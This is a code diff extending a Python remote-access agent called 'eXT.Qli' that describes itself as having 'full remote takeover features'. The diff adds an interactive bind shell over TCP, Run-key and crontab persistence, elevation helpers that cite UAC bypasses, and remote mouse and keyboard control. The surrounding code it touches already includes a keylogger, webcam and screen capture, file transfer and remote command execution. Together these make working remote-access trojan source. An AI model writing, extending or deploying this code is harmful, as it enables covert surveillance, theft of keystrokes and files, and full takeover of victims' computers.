@@ -1,7 +1,8 @@
 #!/usr/bin/env python3
 """
 eXT.Qli Windows/Linux agent with full remote takeover features.
-Integrated TCP port opener as a new command.
+Includes: interactive TCP shell, persistence, privilege escalation helpers,
+and full remote control (mouse/keyboard) via WebSocket.
 """
 
 from __future__ import annotations
@@ -297,7 +298,6 @@ def collect_system_info(extended: bool = False) -> Dict[str, Any]:
         "wazuh_status": get_wazuh_status(),
     }
     if extended:
-        # Additional info that may be useful for takeover
         info["username"] = os.getlogin() if hasattr(os, "getlogin") else "unknown"
         info["current_dir"] = os.getcwd()
         info["python_version"] = platform.python_version()
@@ -346,7 +346,6 @@ def send_task_result(task_id: Optional[int], result_status: str, output_text: st
         log("Task result not posted because no task_id was provided by the server.")
         return
 
-    # If output_text is too large, we could truncate, but WebSocket can handle large messages.
     payload = {
         "shared_token": SHARED_TOKEN,
         "agent_uuid": AGENT_UUID,
@@ -369,7 +368,7 @@ def heartbeat_loop() -> None:
 
 
 # =========================
-# Minimal WebSocket client (unchanged)
+# Minimal WebSocket client
 # =========================
 class SimpleWebSocketClient:
     def __init__(self, url: str, timeout: int = 15) -> None:
@@ -535,7 +534,7 @@ class SimpleWebSocketClient:
 
 
 # =========================
-# Screen capture helpers (unchanged)
+# Screen capture helpers
 # =========================
 def command_exists(name: str) -> bool:
     return shutil.which(name) is not None
@@ -727,7 +726,7 @@ SCREEN_CAPTURE = ScreenCaptureBackend()
 
 
 # =========================
-# Screen streaming (unchanged)
+# Screen streaming
 # =========================
 class ScreenStreamer:
     def __init__(self) -> None:
@@ -826,12 +825,53 @@ SCREEN_STREAMER = ScreenStreamer()
 
 
 # =========================
+# Remote control (input simulation)
+# =========================
+def handle_mouse_move(x: int, y: int) -> None:
+    if PYAUTOGUI_AVAILABLE:
+        try:
+            pyautogui.moveTo(x, y)
+        except Exception as e:
+            log(f"Mouse move error: {e}")
+
+
+def handle_mouse_click(button: str, pressed: bool) -> None:
+    if not PYAUTOGUI_AVAILABLE:
+        return
+    try:
+        btn = pyautogui.LEFT if button == 'left' else (pyautogui.RIGHT if button == 'right' else pyautogui.MIDDLE)
+        if pressed:
+            pyautogui.mouseDown(button=btn)
+        else:
+            pyautogui.mouseUp(button=btn)
+    except Exception as e:
+        log(f"Mouse click error: {e}")
+
+
+def handle_mouse_scroll(delta: int) -> None:
+    if PYAUTOGUI_AVAILABLE:
+        try:
+            pyautogui.scroll(delta)
+        except Exception as e:
+            log(f"Scroll error: {e}")
+
+
+def handle_key_event(key: str, pressed: bool) -> None:
+    if not PYAUTOGUI_AVAILABLE:
+        return
+    try:
+        if pressed:
+            pyautogui.keyDown(key)
+        else:
+            pyautogui.keyUp(key)
+    except Exception as e:
+        log(f"Key error: {e}")
+
+
+# =========================
 # Remote takeover features
 # =========================
 def execute_command(command: str) -> Tuple[str, str]:
-    """
-    Execute a shell command and return (stdout, stderr).
-    """
     try:
         proc = subprocess.run(
             command,
@@ -850,7 +890,6 @@ def execute_command(command: str) -> Tuple[str, str]:
 
 
 def keylogger_start() -> str:
-    """Start the keylogger thread if not already running."""
     global KEYLOG_ACTIVE, KEYLOG_THREAD
     with KEYLOG_LOCK:
         if KEYLOG_ACTIVE:
@@ -860,22 +899,17 @@ def keylogger_start() -> str:
             return "Keylogger not available: pynput module missing. Install with 'pip install pynput'."
 
         try:
-            # Clear previous log file
             KEYLOG_FILE.write_text("", encoding="utf-8")
-            # Define listener callback
             def on_press(key):
                 try:
                     char = key.char
                 except AttributeError:
-                    # Special key
                     char = f" [{key}] "
                 with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
                     f.write(char)
-            # Start listener in a separate thread
             listener = pynput.keyboard.Listener(on_press=on_press)
             listener.start()
             KEYLOG_ACTIVE = True
-            # Store listener for later stop
             KEYLOG_THREAD = listener
             return "Keylogger started. Logging to " + str(KEYLOG_FILE)
         except Exception as e:
@@ -883,7 +917,6 @@ def keylogger_start() -> str:
 
 
 def keylogger_stop() -> str:
-    """Stop the keylogger and return captured keystrokes."""
     global KEYLOG_ACTIVE, KEYLOG_THREAD
     with KEYLOG_LOCK:
         if not KEYLOG_ACTIVE:
@@ -893,9 +926,8 @@ def keylogger_stop() -> str:
             if KEYLOG_THREAD and hasattr(KEYLOG_THREAD, "stop"):
                 KEYLOG_THREAD.stop()
             elif KEYLOG_THREAD:
-                KEYLOG_THREAD = None  # Listener might have no stop method; just set to None
+                KEYLOG_THREAD = None
             KEYLOG_ACTIVE = False
-            # Read log content
             if KEYLOG_FILE.exists():
                 content = KEYLOG_FILE.read_text(encoding="utf-8", errors="replace")
             else:
@@ -906,9 +938,6 @@ def keylogger_stop() -> str:
 
 
 def file_upload(file_path: str) -> str:
-    """
-    Read file and return base64 encoded content.
-    """
     path = Path(file_path)
     if not path.exists():
         return f"File not found: {file_path}"
@@ -921,13 +950,9 @@ def file_upload(file_path: str) -> str:
 
 
 def file_download(file_path: str, content_b64: str) -> str:
-    """
-    Write base64 encoded content to given path.
-    """
     path = Path(file_path)
     try:
         data = base64.b64decode(content_b64)
-        # Create parent directories if needed
         path.parent.mkdir(parents=True, exist_ok=True)
         path.write_bytes(data)
         return f"File written to {path.resolve()}"
@@ -936,9 +961,6 @@ def file_download(file_path: str, content_b64: str) -> str:
 
 
 def webcam_capture() -> str:
-    """
-    Capture a single frame from the first webcam and return base64 encoded image.
-    """
     if not CV2_AVAILABLE:
         return "Webcam capture not available: opencv-python module missing. Install with 'pip install opencv-python'."
 
@@ -950,22 +972,17 @@ def webcam_capture() -> str:
     if not ret:
         return "Failed to capture frame."
 
-    # Encode as JPEG
     _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 80])
     encoded = base64.b64encode(buffer).decode("ascii")
     return f"WEBCAM:{encoded}"
 
 
 def screenshot() -> str:
-    """
-    Capture screenshot using pyautogui (cross-platform) and return base64 image.
-    """
     if not PYAUTOGUI_AVAILABLE:
         return "Screenshot not available: pyautogui module missing. Install with 'pip install pyautogui'."
 
     try:
         img = pyautogui.screenshot()
-        # Save to bytes
         with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as f:
             temp_path = f.name
         img.save(temp_path, format="PNG")
@@ -979,31 +996,89 @@ def screenshot() -> str:
 
 
 # =========================
-# TCP Server Functions (new)
+# Interactive TCP Shell
 # =========================
-def tcp_server_run(port: int, welcome_message: bytes) -> None:
-    """Background thread for the TCP server."""
+def handle_shell_client(client_sock: socket.socket, addr: Tuple[str, int]) -> None:
+    try:
+        if os.name == "nt":
+            shell_cmd = ["cmd.exe"]
+        else:
+            shell_cmd = ["/bin/bash", "-i"]
+
+        proc = subprocess.Popen(
+            shell_cmd,
+            stdin=subprocess.PIPE,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            text=True,
+            bufsize=1,
+            universal_newlines=True,
+        )
+
+        client_sock.sendall(b"\n=== eXT.Qli Interactive Shell ===\nType 'exit' to close.\n\n")
+
+        def read_from_proc():
+            while proc.poll() is None:
+                try:
+                    out = proc.stdout.readline()
+                    if not out:
+                        break
+                    client_sock.sendall(out.encode())
+                except Exception:
+                    break
+
+        def read_from_sock():
+            while proc.poll() is None:
+                try:
+                    data = client_sock.recv(4096)
+                    if not data:
+                        break
+                    proc.stdin.write(data.decode())
+                    proc.stdin.flush()
+                except Exception:
+                    break
+
+        t1 = threading.Thread(target=read_from_proc, daemon=True)
+        t2 = threading.Thread(target=read_from_sock, daemon=True)
+        t1.start()
+        t2.start()
+        t1.join(timeout=1)
+        t2.join(timeout=1)
+    except Exception as e:
+        try:
+            client_sock.sendall(f"\nShell error: {e}\n".encode())
+        except:
+            pass
+    finally:
+        try:
+            client_sock.close()
+        except:
+            pass
+
+
+def tcp_server_run(port: int, welcome_message: bytes, interactive: bool = True) -> None:
     global TCP_SERVER_SOCKET, TCP_SERVER_PORT
 
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        # Allow address reuse
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         host = get_local_ip()
         sock.bind((host, port))
-        sock.listen(1)
+        sock.listen(5)
         TCP_SERVER_SOCKET = sock
         TCP_SERVER_PORT = port
-        log(f"TCP server listening on {host}:{port}")
+        log(f"TCP server listening on {host}:{port} (interactive={interactive})")
 
         while not TCP_SERVER_STOP_EVENT.is_set():
             try:
-                # Use a timeout so we can check stop_event periodically
                 sock.settimeout(1.0)
                 client_sock, client_addr = sock.accept()
                 log(f"TCP connection from {client_addr}")
-                client_sock.sendall(welcome_message)
-                client_sock.close()
+                if interactive:
+                    threading.Thread(target=handle_shell_client, args=(client_sock, client_addr), daemon=True).start()
+                else:
+                    client_sock.sendall(welcome_message)
+                    client_sock.close()
             except socket.timeout:
                 continue
             except Exception as e:
@@ -1023,8 +1098,7 @@ def tcp_server_run(port: int, welcome_message: bytes) -> None:
         log("TCP server stopped")
 
 
-def tcp_server_start(port: int, welcome_message: str = "Hello! You've connected to the server.\n") -> str:
-    """Start a TCP server on the given port. Returns status."""
+def tcp_server_start(port: int, welcome_message: str = "Hello! You've connected to the server.\n", interactive: bool = True) -> str:
     global TCP_SERVER_THREAD, TCP_SERVER_STOP_EVENT, TCP_SERVER_PORT
 
     with threading.Lock():
@@ -1034,16 +1108,15 @@ def tcp_server_start(port: int, welcome_message: str = "Hello! You've connected 
         TCP_SERVER_STOP_EVENT.clear()
         TCP_SERVER_THREAD = threading.Thread(
             target=tcp_server_run,
-            args=(port, welcome_message.encode("utf-8")),
+            args=(port, welcome_message.encode("utf-8"), interactive),
             name="tcp-server",
             daemon=True
         )
         TCP_SERVER_THREAD.start()
-        return f"TCP server started on port {port} (local IP: {get_local_ip()})"
+        return f"TCP server started on port {port} (local IP: {get_local_ip()}) with interactive={'yes' if interactive else 'no'}"
 
 
 def tcp_server_stop() -> str:
-    """Stop the running TCP server."""
     global TCP_SERVER_THREAD, TCP_SERVER_STOP_EVENT
 
     with threading.Lock():
@@ -1054,6 +1127,125 @@ def tcp_server_stop() -> str:
         TCP_SERVER_THREAD.join(timeout=3.0)
         TCP_SERVER_THREAD = None
         return "TCP server stopped."
+
+
+# =========================
+# Persistence
+# =========================
+def install_persistence() -> str:
+    script_path = str(Path(__file__).resolve())
+    python_exe = sys.executable
+
+    if os.name == "nt":
+        try:
+            import winreg
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                                 r"Software\Microsoft\Windows\CurrentVersion\Run",
+                                 0, winreg.KEY_SET_VALUE)
+            winreg.SetValueEx(key, "eXTQliAgent", 0, winreg.REG_SZ, f'"{python_exe}" "{script_path}"')
+            winreg.CloseKey(key)
+            return "Persistence installed: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\eXTQliAgent"
+        except Exception as e:
+            return f"Failed to install Windows persistence: {e}"
+    else:
+        try:
+            cron_line = f"@reboot {python_exe} {script_path} > /dev/null 2>&1"
+            result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
+            current = result.stdout
+            if cron_line in current:
+                return "Persistence already present in crontab."
+            new_cron = current.rstrip() + "\n" + cron_line + "\n"
+            proc = subprocess.run(["crontab", "-"], input=new_cron, text=True, capture_output=True)
+            if proc.returncode == 0:
+                return "Persistence installed: @reboot crontab entry added."
+            else:
+                return f"Failed to install crontab: {proc.stderr}"
+        except Exception as e:
+            return f"Failed to install Linux persistence: {e}"
+
+
+def remove_persistence() -> str:
+    script_path = str(Path(__file__).resolve())
+
+    if os.name == "nt":
+        try:
+            import winreg
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                                 r"Software\Microsoft\Windows\CurrentVersion\Run",
+                                 0, winreg.KEY_SET_VALUE)
+            winreg.DeleteValue(key, "eXTQliAgent")
+            winreg.CloseKey(key)
+            return "Persistence removed from Windows Registry."
+        except FileNotFoundError:
+            return "Persistence entry not found."
+        except Exception as e:
+            return f"Failed to remove Windows persistence: {e}"
+    else:
+        try:
+            result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
+            if result.returncode != 0:
+                return "No crontab for this user."
+            lines = result.stdout.splitlines()
+            cron_line = f"@reboot {sys.executable} {script_path} > /dev/null 2>&1"
+            new_lines = [line for line in lines if line.strip() != cron_line]
+            new_cron = "\n".join(new_lines) + "\n"
+            proc = subprocess.run(["crontab", "-"], input=new_cron, text=True, capture_output=True)
+            if proc.returncode == 0:
+                return "Persistence removed from crontab."
+            else:
+                return f"Failed to update crontab: {proc.stderr}"
+        except Exception as e:
+            return f"Failed to remove Linux persistence: {e}"
+
+
+# =========================
+# Privilege escalation helpers
+# =========================
+def is_admin() -> bool:
+    if os.name == "nt":
+        try:
+            return ctypes.windll.shell32.IsUserAnAdmin() != 0
+        except:
+            return False
+    else:
+        return os.geteuid() == 0
+
+
+def run_as_admin(command: str) -> str:
+    if is_admin():
+        stdout, stderr = execute_command(command)
+        return f"[Already admin] STDOUT:\n{stdout}\nSTDERR:\n{stderr}"
+
+    if os.name == "nt":
+        try:
+            result = ctypes.windll.shell32.ShellExecuteW(
+                None, "runas", "cmd.exe", f"/c {command}", None, 1
+            )
+            if result > 32:
+                return f"Elevated command started with ShellExecute. Check manually. Command: {command}"
+            else:
+                return f"Elevation failed. ShellExecute error code: {result}"
+        except Exception as e:
+            return f"Failed to elevate: {e}"
+    else:
+        sudo_cmd = f"sudo {command}"
+        stdout, stderr = execute_command(sudo_cmd)
+        if stderr:
+            return f"Elevation failed (maybe need password?)\nSTDERR:\n{stderr}\nSTDOUT:\n{stdout}"
+        return f"Elevated command succeeded.\nSTDOUT:\n{stdout}"
+
+
+def privesc_example() -> str:
+    if is_admin():
+        return "Already running as admin/root."
+    suggestions = []
+    if os.name == "nt":
+        suggestions.append("Use 'run_as_admin' task with a command like 'whoami' to test.")
+        suggestions.append("Or use known UAC bypasses (e.g., fodhelper, cmstp) via 'cmd' task.")
+    else:
+        suggestions.append("Use 'run_as_admin' task with a command like 'id' to test.")
+        suggestions.append("Or use 'sudo -i' if password is cached.")
+    return "Not elevated. Suggestions:\n" + "\n".join(suggestions)
 
 
 # =========================
@@ -1075,17 +1267,15 @@ def handle_task(message: Dict[str, Any]) -> None:
 
     log(f"Received task: {task_name}")
 
-    # Basic tasks (existing)
+    # Basic tasks
     if task_name == "ping":
         output = f"pong from {get_hostname()} ({get_local_ip()})"
-        log(output)
         send_task_result(task_id, "success", output)
         return
 
     if task_name in {"collect_info", "info", "heartbeat"}:
         info = collect_system_info(extended=True)
         output = json.dumps(info, ensure_ascii=False)
-        log(f"Collected info for task {task_name}")
         send_task_result(task_id, "success", output)
         return
 
@@ -1103,7 +1293,7 @@ def handle_task(message: Dict[str, Any]) -> None:
         send_task_result(task_id, "success", output)
         return
 
-    # Keylogger start/stop
+    # Keylogger
     if task_name == "keylogger_start":
         result = keylogger_start()
         send_task_result(task_id, "success", result)
@@ -1120,7 +1310,6 @@ def handle_task(message: Dict[str, Any]) -> None:
             send_task_result(task_id, "error", "No file_path provided.")
             return
         result = file_upload(file_path)
-        # Result may be prefixed with "FILE:" and then base64 data
         send_task_result(task_id, "success", result)
         return
     if task_name == "file_download":
@@ -1133,19 +1322,17 @@ def handle_task(message: Dict[str, Any]) -> None:
         send_task_result(task_id, "success", result)
         return
 
-    # Webcam capture
+    # Webcam / screenshot
     if task_name == "webcam":
         result = webcam_capture()
         send_task_result(task_id, "success", result)
         return
-
-    # Screenshot (using pyautogui)
     if task_name == "screenshot":
         result = screenshot()
         send_task_result(task_id, "success", result)
         return
 
-    # New tasks: TCP server control
+    # TCP server control
     if task_name == "tcp_server_start":
         port = data.get("port") or message.get("port")
         if port is None:
@@ -1157,12 +1344,43 @@ def handle_task(message: Dict[str, Any]) -> None:
             send_task_result(task_id, "error", "Invalid port number.")
             return
         welcome_msg = data.get("message", "Hello! You've connected to the server.\n")
-        result = tcp_server_start(port, welcome_msg)
+        interactive = data.get("interactive", True)
+        if isinstance(interactive, str):
+            interactive = interactive.lower() in ("true", "1", "yes")
+        result = tcp_server_start(port, welcome_msg, interactive)
         send_task_result(task_id, "success", result)
         return
 
     if task_name == "tcp_server_stop":
         result = tcp_server_stop()
+        send_task_result(task_id, "success", result)
+        return
+
+    # Persistence tasks
+    if task_name == "install_persistence":
+        result = install_persistence()
+        send_task_result(task_id, "success", result)
+        return
+    if task_name == "remove_persistence":
+        result = remove_persistence()
+        send_task_result(task_id, "success", result)
+        return
+
+    # Privilege escalation tasks
+    if task_name == "is_admin":
+        result = f"Admin/root: {is_admin()}"
+        send_task_result(task_id, "success", result)
+        return
+    if task_name == "run_as_admin":
+        command = data.get("command") or message.get("command")
+        if not command:
+            send_task_result(task_id, "error", "No command provided for elevation.")
+            return
+        result = run_as_admin(command)
+        send_task_result(task_id, "success", result)
+        return
+    if task_name == "privesc_example":
+        result = privesc_example()
         send_task_result(task_id, "success", result)
         return
 
@@ -1182,13 +1400,33 @@ def handle_ws_message(message: Dict[str, Any], client: SimpleWebSocketClient) ->
     if msg_type == "screen_control":
         action = str(message.get("action") or "").strip().lower()
         if action == "start":
-            log("Received screen_control:start")
             SCREEN_STREAMER.start(client)
             return
         if action == "stop":
-            log("Received screen_control:stop")
             SCREEN_STREAMER.stop("Viewer stopped or disconnected.")
             return
+
+    # NEW: Remote input events
+    if msg_type == "input_event":
+        event_type = message.get("event_type")
+        if event_type == "mouse_move":
+            x = message.get("x")
+            y = message.get("y")
+            if x is not None and y is not None:
+                threading.Thread(target=handle_mouse_move, args=(x, y), daemon=True).start()
+        elif event_type == "mouse_click":
+            button = message.get("button", "left")
+            pressed = message.get("pressed", False)
+            threading.Thread(target=handle_mouse_click, args=(button, pressed), daemon=True).start()
+        elif event_type == "mouse_scroll":
+            delta = message.get("delta", 0)
+            threading.Thread(target=handle_mouse_scroll, args=(delta,), daemon=True).start()
+        elif event_type == "key":
+            key = message.get("key", "")
+            pressed = message.get("pressed", False)
+            if key:
+                threading.Thread(target=handle_key_event, args=(key, pressed), daemon=True).start()
+        return
 
     if msg_type == "registered":
         log(f"Broker registration acknowledged: {message}")
@@ -1198,7 +1436,7 @@ def handle_ws_message(message: Dict[str, Any], client: SimpleWebSocketClient) ->
 
 
 # =========================
-# Main agent loop (unchanged)
+# Main agent loop
 # =========================
 def websocket_loop() -> None:
     register_message = {
@@ -1267,7 +1505,6 @@ def main() -> int:
     finally:
         STOP_EVENT.set()
         SCREEN_STREAMER.stop("Agent shutdown.")
-        # Stop TCP server if running
         if TCP_SERVER_THREAD and TCP_SERVER_THREAD.is_alive():
             tcp_server_stop()
         heartbeat_thread.join(timeout=2)
